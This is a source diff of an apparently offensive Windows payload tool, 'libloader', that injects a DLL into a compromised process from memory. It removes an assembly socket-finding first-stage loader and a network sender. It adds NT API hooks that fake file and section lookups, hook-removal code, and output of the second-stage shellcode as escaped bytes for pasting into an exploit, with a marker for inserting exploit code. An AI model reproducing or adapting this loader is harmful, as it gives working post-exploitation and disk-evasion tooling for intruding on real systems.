@@ -22,7 +22,6 @@
  *
  * TODO:
  *
- * - Clean up the hooks
  * - Hide the DLL from PEB
  *
  *
@@ -41,113 +40,10 @@
 #include <sys/stat.h>
 
 #include "libloader.h"
-#include "shell.c"
 
 #pragma comment(lib, "ws2_32.lib")
 
 #pragma warning(disable: 4068)
-
-
-/* 
- * 1st stage loader
- * This is somewhat straight rip off skape's "findfdread.c"
- * 
- */
-
-int __declspec(naked) loader1_start() {
-	__asm {
-		jmp startup                        ; Skip over our lookup functions
-
-#include "generic.c"
-
-	startup:
-
-	shorten_find_function:
-		jmp  shorten_find_function_forward ; Jump forward
-	shorten_find_function_middle:
-		jmp  shorten_find_function_end     ; Jump end
-	shorten_find_function_forward:
-		call shorten_find_function_middle  ; Call back
-	shorten_find_function_end:
-		pop  edi                           ; Grab our VMA
-		sub  edi, 0x57                     ; Subtract 0x57 to point to find_function
-
-		call find_kernel32                 ; Resolve kernel32 base address
-		mov  edx, eax                      ; Save it in edx
-
-		push HASH_LoadLibraryA             ; Push LoadLibraryA hash
-		push edx                           ; Push kernel32 handle
-		call edi                           ; Call find_function
-		mov  ebx, eax                      ; Save the VMA of LoadLibraryA in ebx
-
-	load_ws2_32:
-		xor  eax, eax                      ; Zero eax
-		mov  ax, 0x3233                    ; Set low half to 32
-		push eax                           ; Push it
-		push 0x5f327377                    ; Push 'ws2_'
-		push esp                           ; Push the pointer to 'ws2_32'
-		call ebx                           ; Call LoadLibraryA
-		mov  edx, eax                      ; Save the handle in edx
-
-	load_ws2_32_syms:
-		push HASH_getpeername              ; Push getpeername hash
-		push edx                           ; Push ws2_32 handle
-		call edi                           ; Call find_function
-		mov  esi, eax                      ; Save the VMA of getpeername in esi
-
-		push HASH_recv                     ; Push recv hash
-		push edx                           ; Push ws2_32 handle
-		call edi                           ; Call find_function
-		push eax                           ; Save the VMA of recv on the stack
-
-	find_fd:
-		sub  esp, 0x14                     ; Allocate 20 bytes of stack space
-		mov  ebp, esp                      ; Save stack pointer in ebp
-		xor  eax, eax                      ; Zero eax
-		mov  al, 0x10                      ; Set low byte of eax to 0x10 to indicate size
-		lea  edx, [esp + eax]              ; Get the address of 16 bytes into the stack 
-		mov  [edx], eax                    ; Store the size at said point
-		xor  edi, edi                      ; Zero edi, our fd counter
-	find_fd_loop:
-		inc  edi                           ; Increment our fd
-		push edx                           ; Save edx since it will be clobbered
-		push edx                           ; Push the pointer to our size
-		push ebp                           ; Push the pointer to our name buf
-		push edi                           ; Push our fd
-		call esi                           ; Call getpeername
-		test eax, eax                      ; Check to see if this fd is valid
-		pop  edx                           ; Restore edx
-		jnz  find_fd_loop                  ; If ZF is not set, we failed.  Loop again.
-	find_fd_check_port:
-		cmp  word ptr [esp + 0x02], 0x5c11 ; Check to see if the port matches what we want (4444).
-		jne  find_fd_loop                  ; If not, loop again.
-
-	find_fd_check_finished:
-		add  esp, 0x14                     ; Restore stack
-		pop  esi                           ; Snag recv() pointer
-
-	recv_fd:
-		xor  ebx, ebx                      ; Zero ebx
-		inc  eax                           ; Set eax to 0x00000001
-		sal  eax, 0x0d                     ; Shift left 14 setting eax to 0x00002000
-		sub  esp, eax                      ; Allocate 8K of stack space.
-		mov  ebp, esp                      ; Save the stack pointer
-		push ebx                           ; Push Flags (0)
-		push eax                           ; Push Length (0x2000)
-		push ebp                           ; Push Buffer
-		push edi                           ; Push Fd
-		call esi                           ; Call recv
-	jmp_code:
-		jmp  ebp                           ; Jump into our code
-	}
-}
-
-/* Just a stub for counting the shellcode size */
-
-int __declspec(naked) loader1_end() {
-	__asm ret
-}
-
 
 
 /*
@@ -163,8 +59,7 @@ void loader2_start() {
 	SHELLCODE_CTX	ctx;
 	char winsock[10];
 
-	__asm 
-	{
+	__asm {
 		jmp  callback			; Jump to callback address
 
 	startup:
@@ -214,6 +109,11 @@ void loader2_start() {
 		call find_function
 		add  esp, 8
 		mov  ctx.VirtualAlloc, eax
+		push HASH_VirtualFree
+		push ebx
+		call find_function
+		add  esp, 8
+		mov  ctx.VirtualFree, eax
 		push HASH_VirtualQuery
 		push ebx
 		call find_function
@@ -270,13 +170,6 @@ void loader2_start() {
 		call find_function
 		add  esp, 8
 		mov  ctx.NtMapViewOfSection, eax
-		push HASH_RtlUnicodeStringToAnsiString
-		push ebx
-		call find_function
-		add  esp, 8
-		mov  ctx.RtlUnicodeStringToAnsiString, eax
-		
-
 	}
 
 	winsock[0] = 'w';
@@ -298,8 +191,6 @@ void loader2_start() {
 		call find_function
 		add  esp, 8
 		mov  ctx.recv, eax
-
-
 	}
 
 	/* Now call the shellcode main function */
@@ -350,6 +241,29 @@ int __declspec(naked) find_ctx() {
 	}
 }
 
+
+/*
+ * Find library name from given unicode string
+ *
+ */
+int find_string(SHELLCODE_CTX *ctx, UNICODE_STRING *str) {
+	int i, j;
+
+	for (i = 0; i < str->Length; i++) {
+		for (j = 0; j < ctx->liblen; j++) {
+			if (str->Buffer[i + j] != ctx->libname[j])
+				break;
+		}
+
+		/* Match */
+		if (j == ctx->liblen) {
+			return 0;
+		}
+	}
+	return 1;
+}
+
+
 /* NtOpenSection hook */
 
 NTSTATUS NTAPI m_NtOpenSection(
@@ -358,32 +272,14 @@ NTSTATUS NTAPI m_NtOpenSection(
 	POBJECT_ATTRIBUTES ObjectAttributes) {
 
 	SHELLCODE_CTX	*ctx;
-	ANSI_STRING 	dest;
-	char 		buf[256] = {0};
-	USHORT 		len, max;
-	int 		i, j;
-
-	len = max = sizeof(buf);
-	dest.Length = len;
-	dest.MaximumLength = max;
-	dest.Buffer = (PWSTR)buf;
-
+	
 	/* Find our context */
 	ctx = (SHELLCODE_CTX *) find_ctx();
 
-	ctx->RtlUnicodeStringToAnsiString(&dest, ObjectAttributes->ObjectName, 
-		FALSE);
+	if (!find_string(ctx, ObjectAttributes->ObjectName)) {
+		*SectionHandle = (PHANDLE)ctx->mapped_address;
+		return STATUS_SUCCESS;
 
-	/* strstr */
-	for (i = 0; buf[i] != 0; i++) {
-		for (j = 0; j < ctx->liblen; j++) {
-			if (buf[i + j] != ctx->libname[j])
-				break;
-		}
-		if (j == ctx->liblen) {
-			*SectionHandle = (PHANDLE)ctx->mapped_address;
-			return STATUS_SUCCESS;
-		}
 	}
 	return ctx->p_NtOpenSection(SectionHandle, DesiredAccess, 
 		ObjectAttributes);
@@ -398,30 +294,11 @@ NTSTATUS NTAPI m_NtQueryAttributesFile(
 	PFILE_BASIC_INFORMATION FileAttributes) {
 
 	SHELLCODE_CTX	*ctx;
-	ANSI_STRING 	dest;
-	char 		buf[256] = {0};
-	USHORT 		len, max;
-	DWORD		psize = sizeof(PFILE_BASIC_INFORMATION);
-	int 		i, j;
-
-	len = max = sizeof(buf);
-	dest.Length = len;
-	dest.MaximumLength = max;
-	dest.Buffer = (PWSTR)buf;
 
 	/* Find our context */
 	ctx = (SHELLCODE_CTX *) find_ctx();
 
-	ctx->RtlUnicodeStringToAnsiString(&dest, ObjectAttributes->ObjectName, 
-		FALSE);
-
-	/* strstr */
-	for (i = 0; buf[i] != 0; i++) {
-		for (j = 0; j < ctx->liblen; j++) {
-			if (buf[i + j] != ctx->libname[j])
-				break;
-		}
-		if (j == ctx->liblen) {
+	if (!find_string(ctx, ObjectAttributes->ObjectName)) {
 
 		/*
 		 * struct PFILE_BASIC_INFORMATION must be actually filled
@@ -436,10 +313,9 @@ NTSTATUS NTAPI m_NtQueryAttributesFile(
 		FileAttributes->LastWriteTime.LowPart = LOW_TIME_1;
 		FileAttributes->LastWriteTime.HighPart = HIGH_TIME;
 		FileAttributes->ChangeTime.LowPart = LOW_TIME_1;
-		FileAttributes->ChangeTime.HighPart = HIGH_TIME; 
-		FileAttributes->FileAttributes = FILE_ATTRIBUTE_NORMAL;  
+		FileAttributes->ChangeTime.HighPart = HIGH_TIME;
+		FileAttributes->FileAttributes = FILE_ATTRIBUTE_NORMAL; 
 		return STATUS_SUCCESS;
-		}
 	}
 	
 	return ctx->p_NtQueryAttributesFile(ObjectAttributes, FileAttributes);
@@ -457,33 +333,13 @@ void NTAPI m_NtOpenFile(
 	ULONG OpenOptions) {
 	
 	SHELLCODE_CTX	*ctx;
-	ANSI_STRING 	dest;
-	char 		buf[256] = {0};
-	USHORT 		len, max;
-	int 		i, j;
-
-	len = max = sizeof(buf);
-	dest.Length = len;
-	dest.MaximumLength = max;
-	dest.Buffer = (PWSTR)buf;
-
 
 	/* Find our context */
 	ctx = (SHELLCODE_CTX *) find_ctx();
-	
-	ctx->RtlUnicodeStringToAnsiString(&dest, ObjectAttributes->ObjectName, 
-		FALSE);
 
-	/* strstr */
-	for (i = 0; buf[i] != 0; i++) {
-		for (j = 0; j < ctx->liblen; j++) {
-			if (buf[i + j] != ctx->libname[j])
-				break;
-		}
-		if (j == ctx->liblen) {
-			*FileHandle = (PVOID)ctx->mapped_address;
-			return;
-		}
+	if (!find_string(ctx, ObjectAttributes->ObjectName)) {
+		*FileHandle = (PVOID)ctx->mapped_address;
+		return;
 	}
 
 	ctx->p_NtOpenFile(
@@ -493,6 +349,7 @@ void NTAPI m_NtOpenFile(
 		IoStatusBlock,
 		ShareAccess,
 		OpenOptions);
+	return;
 	
 }
 
@@ -569,6 +426,7 @@ NTSTATUS NTAPI m_NtMapViewOfSection(
 		Protect);
 }
 
+
 /* Patch given function */
 
 void patch_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub, 
@@ -626,10 +484,14 @@ void patch_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub,
 void install_hooks(SHELLCODE_CTX *ctx) {
 
 	/* NtMapViewOfSection */
+
+	/* Patch */
 	patch_function(ctx, ctx->NtMapViewOfSection, 
 		ctx->s_NtMapViewOfSection, 
 		(unsigned char *)((DWORD)m_NtMapViewOfSection -
 			(DWORD)loader2_start) + ctx->offset);
+
+	/* Copy pointer */
 	ctx->p_NtMapViewOfSection = 
 		(f_NtMapViewOfSection)ctx->s_NtMapViewOfSection;
 
@@ -641,26 +503,77 @@ void install_hooks(SHELLCODE_CTX *ctx) {
 	ctx->p_NtQueryAttributesFile = 
 		(f_NtQueryAttributesFile)ctx->s_NtQueryAttributesFile;
 
-
 	/* NtOpenFile */
 	patch_function(ctx, ctx->NtOpenFile, ctx->s_NtOpenFile, 
 		(unsigned char *)((DWORD)m_NtOpenFile - 
 			(DWORD)loader2_start) + ctx->offset);
 	ctx->p_NtOpenFile = (f_NtOpenFile)ctx->s_NtOpenFile;
 
-
 	/* NtCreateSection */
 	patch_function(ctx, ctx->NtCreateSection, ctx->s_NtCreateSection, 
 		(unsigned char *)((DWORD)m_NtCreateSection - 
 			(DWORD)loader2_start) + ctx->offset);
 	ctx->p_NtCreateSection = (f_NtCreateSection)ctx->s_NtCreateSection;
-
-
+	
+	
 	/* NtOpenSection */
 	patch_function(ctx, ctx->NtOpenSection, ctx->s_NtOpenSection, 
 		(unsigned char *)((DWORD)m_NtOpenSection - 
 			(DWORD)loader2_start) + ctx->offset);
 	ctx->p_NtOpenSection = (f_NtOpenSection)ctx->s_NtOpenSection;
+	
+}
+
+/* Restore given function */
+
+void restore_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub) {
+	DWORD				protect;
+	ULONG 				bytes, written;
+	MEMORY_BASIC_INFORMATION	mbi_thunk;
+
+	bytes = 5;
+
+	/* Patch original function */
+
+	/* Fix protection */
+	ctx->VirtualQuery((char *)address, &mbi_thunk, 
+		sizeof(MEMORY_BASIC_INFORMATION));
+	ctx->VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
+		PAGE_EXECUTE_READWRITE, &mbi_thunk.Protect);
+		
+	/* Copy bytes back to function */
+	ctx->WriteProcessMemory((HANDLE)-1, (char *)address, stub,
+		bytes, &written);
+
+	/* Restore protection */
+	ctx->VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
+		mbi_thunk.Protect, &protect);
+	ctx->FlushInstructionCache((HANDLE)-1, mbi_thunk.BaseAddress,
+		mbi_thunk.RegionSize);
+
+}
+
+/* Remove hooks */
+
+void remove_hooks(SHELLCODE_CTX *ctx) {
+
+	/* NtMapViewOfSection */
+	restore_function(ctx, ctx->NtMapViewOfSection, 
+		ctx->s_NtMapViewOfSection);
+		
+	/* NtQueryAttributesFile */
+	restore_function(ctx, ctx->NtQueryAttributesFile,
+		 ctx->s_NtQueryAttributesFile);
+
+	/* NtOpenFile */
+	restore_function(ctx, ctx->NtOpenFile, ctx->s_NtOpenFile);
+
+	/* NtCreateSection */
+	restore_function(ctx, ctx->NtCreateSection, ctx->s_NtCreateSection);
+	
+	
+	/* NtOpenSection */
+	restore_function(ctx, ctx->NtOpenSection, ctx->s_NtOpenSection);
 	
 
 }
@@ -675,7 +588,6 @@ void map_file(SHELLCODE_CTX *ctx) {
 	
 	dos = (PIMAGE_DOS_HEADER)ctx->file_address;
 	nt = (PIMAGE_NT_HEADERS)(ctx->file_address + dos->e_lfanew);
-
 
 	/* 
 	 * Allocate space for the mapping
@@ -707,6 +619,7 @@ void map_file(SHELLCODE_CTX *ctx) {
 			(PCHAR)ctx->file_address + sect[i].PointerToRawData,
 			sect[i].SizeOfRawData, 0);
 	}
+
 }
 
 
@@ -726,22 +639,9 @@ void map_file(SHELLCODE_CTX *ctx) {
 int loader2_main(SHELLCODE_CTX *ctx) {
 	DWORD		length, base, function;
 	char		name[12];
-	int		bytes = 0, read = 0, left;
+	int		i, bytes, read, left;
 
-	/* DLL name */
-	ctx->libname[0] = 'h';
-	ctx->libname[1] = 'x';
-	ctx->libname[2] = 'r';
-	ctx->libname[3] = '3';
-	ctx->libname[4] = '2';
-	ctx->libname[5] = '.';
-	ctx->libname[6] = 'd';
-	ctx->libname[7] = 'l';
-	ctx->libname[8] = 'l';
-	ctx->libname[9] = '\0';
-	ctx->liblen = sizeof(ctx->libname);
-
-	/* Init function exported by the DLL */
+	/* dll entry point */
 	name[0] = 'I';
 	name[1] = 'n';
 	name[2] = 'i';
@@ -753,18 +653,17 @@ int loader2_main(SHELLCODE_CTX *ctx) {
 	if (bytes <= 0) {
 		ctx->ExitProcess(1);
 	}
-	
 
 	/* Allocate space for data */
-	ctx->file_address = (DWORD)ctx->VirtualAlloc(NULL, length, MEM_COMMIT, 
-		PAGE_READWRITE);
+	ctx->file_address = (DWORD)ctx->VirtualAlloc(NULL, length, 
+		MEM_COMMIT, PAGE_READWRITE);
 	if (ctx->file_address == 0) {
 		ctx->ExitProcess(1);
 	}
-	
 
 	/* Read file */
-	for (left = length; left > 0; left -= bytes, read += bytes) {
+	for (bytes = 0, read = 0, left = length; left > 0; 
+	     left -= bytes, read += bytes) {
 		bytes = ctx->recv(ctx->sd, (char *)(ctx->file_address + read), 
 			left, 0);
 		if (bytes < 0) {
@@ -772,8 +671,16 @@ int loader2_main(SHELLCODE_CTX *ctx) {
 		}
 	}
 
-	map_file(ctx);
+	/* Set the library name */
+	for (i = 0; *(char *)(ctx->file_address + i); i++)
+		ctx->libname[i] = *(char *)(ctx->file_address + i);
+	ctx->libname[i] = 0;
+	ctx->liblen     = i;
 
+	/* Update the file address offset */
+	ctx->file_address += i + 1;
+
+	map_file(ctx);
 
 	/* Write context pointer */
 	*(DWORD *)(((DWORD)ctx_data - (DWORD)loader2_start) + ctx->offset) = 
@@ -781,19 +688,30 @@ int loader2_main(SHELLCODE_CTX *ctx) {
 
 	install_hooks(ctx);
 
-	base = ctx->LoadLibrary(ctx->libname);
+	if ((base = ctx->LoadLibrary(ctx->libname)) == 0) {
+		
+		/* Something is terribly wrong.. */
+		ctx->ExitProcess(1);
+	}
 
+	remove_hooks(ctx);
 
-	/* Run the init function */
-	function = (DWORD)ctx->GetProcAddress((HMODULE)base, (LPCTSTR)name);
-	((int(*)()) (function))(ctx->sd);
+	/* Call entry point, if it exists */
+	if ((function = (DWORD)ctx->GetProcAddress((HMODULE)base, 
+			(LPCTSTR)name)) != 0) {
 
+		((int(*)()) (function))(ctx->sd);
+	} 
+
+	ctx->VirtualFree((LPVOID)((char *)ctx->file_address - ctx->liblen - 1), 
+	      0, MEM_RELEASE);
 
 	ctx->ExitProcess(0);
 
+	ctx = NULL;
 
 	/* Just to keep compiler happy */
-	return(0); 
+	return(0);
 
 }
 
@@ -816,7 +734,7 @@ int __declspec(naked) loader2_end() {
  */
 
 int main(int argc, char **argv) {
-	int 			sd, c, i, off;
+	int 			sd, c, i;
 	char			*buf, databuf[1024];
 	struct hostent 		*hp;
 	struct sockaddr_in 	adr, local;
@@ -827,48 +745,9 @@ int main(int argc, char **argv) {
 	unsigned long		length1, length2;
 
 
-	if (argc < 4) {
-		printf("Usage: %s <host> <port> <dll>\n", argv[0]);
-		exit (1);
-	}
-
-	fp = fopen(argv[3], "rb");
-	if (fp == NULL) {
-		printf("libloader: cannot open DLL\n");
-		exit (1);
-	}
-
-	start1 = (unsigned char *)loader1_start;
-	end1   = (unsigned char *)loader1_end;
-	length1 = end1 - start1;
-
 	start2 = (unsigned char *)loader2_start;
 	end2   = (unsigned char *)loader2_end;
 	length2 = end2 - start2;
-	
-
-	buf = malloc(length1);
-	memcpy(buf, start1, length1);
-
-	WSAStartup(MAKEWORD(2,0), &wsa_data);
-
-	sd = socket(AF_INET, SOCK_STREAM, 0);
-	
-	adr.sin_family = AF_INET;
-	adr.sin_port = htons((unsigned short)atoi(argv[2]));
-	if((adr.sin_addr.s_addr = inet_addr(argv[1])) == -1) {
-		if ((hp = gethostbyname(argv[1])) == NULL) {
-			printf("libloader: error: gethostbyname\n");
-			exit (1);
-		}
-		memcpy(&adr.sin_addr.s_addr, hp->h_addr, 4);
-	}
-
-	if (connect(sd, (struct sockaddr *)&adr, sizeof(adr))) {
-		printf("libloader: error: connect\n");
-		exit (1);
-	}
-
 
 	/* 
 	 * XXXXXXXXXXXX Insert your exploit code here... XXXXXXXXXXX
@@ -880,42 +759,17 @@ int main(int argc, char **argv) {
 	 *
 	 */
 
-	/* The loader might need some time to execute.. */
-	Sleep(500);
-	
-	printf("libloader: sending 2nd stage loader... ");
-	i = send(sd, start2, length2, 0);
-	printf("%d bytes sent\n", i);
 
+	fprintf(stderr, "total size is %lu\n", length2);
+	printf("\"");
 	for (i = 0; i < length2; i++)
-		fprintf(stderr, "\\x%2.2x", start2[i] & 0xff);
-	fflush(stderr);
+	{
+		printf("\\x%02x", start2[i] & 0xff);
 
-
-	Sleep(1000);
-
-	/* 
-	 * Send file length
-	 * XXXXX This is very important, the 2nd loader expects this..
-	 */
-	stat(argv[3], &sstat);
-	c = sstat.st_size;
-	send(sd, (char *)&c, 4, 0);
-
-	printf("libloader: sending payload \"%s\"... ", argv[3]);
-	while (1) {
-		i = fread(databuf, 1, sizeof(databuf), fp);
-		if (i > 0) {
-			send(sd, databuf, i, 0);
-		} else
-			break;
+		if (i > 0 && i % 20 == 0)
+			printf("\" .\n\"");
 	}
-	fclose(fp);
-	printf("%d bytes sent\n", c);
-
-	Sleep(1000);
-
-	read_shell(sd);
+	printf("\"\n");
 
 	exit(0);
 }
